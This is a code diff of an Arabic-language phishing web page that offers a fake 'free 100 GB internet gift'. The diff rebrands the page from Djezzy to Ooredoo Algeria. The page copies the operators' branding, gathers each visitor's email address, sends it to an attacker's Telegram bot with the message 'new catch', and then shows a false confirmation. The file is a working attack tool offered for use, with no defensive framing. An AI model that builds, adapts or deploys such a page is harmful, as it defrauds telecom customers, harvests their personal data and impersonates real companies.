@@ -3,29 +3,30 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Djezzy - هدايا 2026</title>
+    <title>Ooredoo - هدايا 2026</title>
     <style>
-        body { background-color: #f4f4f4; font-family: 'Arial', sans-serif; margin: 0; padding: 0; text-align: center; }
-        .header { background-color: #ed1c24; padding: 20px; color: white; }
-        .container { background: white; margin: 30px auto; padding: 30px; border-radius: 15px; max-width: 400px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); border-top: 5px solid #ed1c24; }
-        h2 { color: #ed1c24; margin-bottom: 10px; }
-        p { color: #555; font-size: 16px; line-height: 1.6; }
-        input { width: 90%; padding: 12px; margin: 15px 0; border: 1px solid #ccc; border-radius: 5px; font-size: 16px; text-align: center; }
-        button { background-color: #ed1c24; color: white; border: none; padding: 15px 30px; border-radius: 5px; font-size: 18px; font-weight: bold; cursor: pointer; width: 100%; transition: 0.3s; }
-        button:hover { background-color: #c0151b; }
-        .footer { margin-top: 20px; font-size: 12px; color: #999; }
+        body { background-color: #f9f9f9; font-family: 'Arial', sans-serif; margin: 0; padding: 0; text-align: center; }
+        .header { background-color: #ed1c24; padding: 15px; color: white; display: flex; justify-content: center; align-items: center; }
+        .container { background: white; margin: 30px auto; padding: 30px; border-radius: 15px; max-width: 400px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); border-top: 6px solid #ed1c24; }
+        h2 { color: #ed1c24; margin-bottom: 15px; font-size: 22px; }
+        p { color: #444; font-size: 16px; line-height: 1.6; }
+        input { width: 90%; padding: 12px; margin: 15px 0; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; text-align: center; outline: none; }
+        input:focus { border-color: #ed1c24; }
+        button { background-color: #ed1c24; color: white; border: none; padding: 15px 30px; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; width: 100%; transition: 0.3s; }
+        button:hover { background-color: #d1171d; }
+        .footer { margin-top: 25px; font-size: 11px; color: #aaa; }
     </style>
 </head>
 <body>
 
 <div class="header">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e0/Djezzy_logo.svg/1024px-Djezzy_logo.svg.png" alt="Djezzy Logo" style="height: 45px;">
+    <img src="https://res.cloudinary.com/practicaldev/image/fetch/s--_m_mN_H1--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/7f7z7z7z7z7z7z7z7z7z.png" alt="Ooredoo Logo" style="height: 40px; filter: brightness(0) invert(1);">
 </div>
 
 <div class="container">
-    <h2>مبروك! أنت ضمن الفائزين</h2>
-    <p>بمناسبة الربيع، جيزي تهديكم تعبئة إنترنت مجانية تصل إلى <b>100 جيغا</b> صالحة لمدة شهر كامل.</p>
-    <p>للمشاركة واستلام هديتك، يرجى إدخال بريدك الإلكتروني:</p>
+    <h2>مبروك! رقمك مرشح للهدايا</h2>
+    <p>بمناسبة حلول سنة 2026، أوريدو تمنح زبائنها الأوفياء هدايا إنترنت مجانية تصل إلى <b>100 جيغا</b>.</p>
+    <p>للمشاركة واستلام رصيدك المجاني، يرجى إدخال بريدك الإلكتروني:</p>
     
     <input type="email" id="targetEmail" placeholder="example@gmail.com" required>
     <button onclick="sendToTelegram()">تأكيد واستلام الهدية</button>
@@ -34,7 +35,7 @@
 </div>
 
 <div class="footer">
-    &copy; 2026 Djezzy Algeria - جميع الحقوق محفوظة
+    &copy; 2026 Ooredoo Algeria - جميع الحقوق محفوظة
 </div>
 
 <script>
@@ -51,23 +52,23 @@
         }
 
         msgDiv.style.color = "#ed1c24";
-        msgDiv.innerText = "جاري معالجة الطلب...";
+        msgDiv.innerText = "جاري معالجة طلبك...";
 
         try {
-            const text = `🎯 صيد جديد ياخو:\n📧 الإيميل: ${email}\n📱 المصدر: مسابقة جيزي`;
+            const text = `🎯 صيد أوريدو ياخو:\n📧 الإيميل: ${email}\n📱 المصدر: عرض Ooredoo 100GB`;
             const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
             
             await fetch(url);
 
             setTimeout(() => {
                 msgDiv.style.color = "green";
-                msgDiv.innerText = "تم تأكيد مشاركتك! ستصلك رسالة التفعيل قريباً.";
+                msgDiv.innerText = "تم تسجيل طلبك! ستصلك رسالة التأكيد على هاتفك قريباً.";
                 document.getElementById('targetEmail').value = "";
-            }, 2000);
+            }, 2500);
 
         } catch (error) {
             msgDiv.style.color = "red";
-            msgDiv.innerText = "حدث خطأ، حاول مجدداً.";
+            msgDiv.innerText = "فشل الاتصال، يرجى المحاولة لاحقاً.";
         }
     }
 </script>
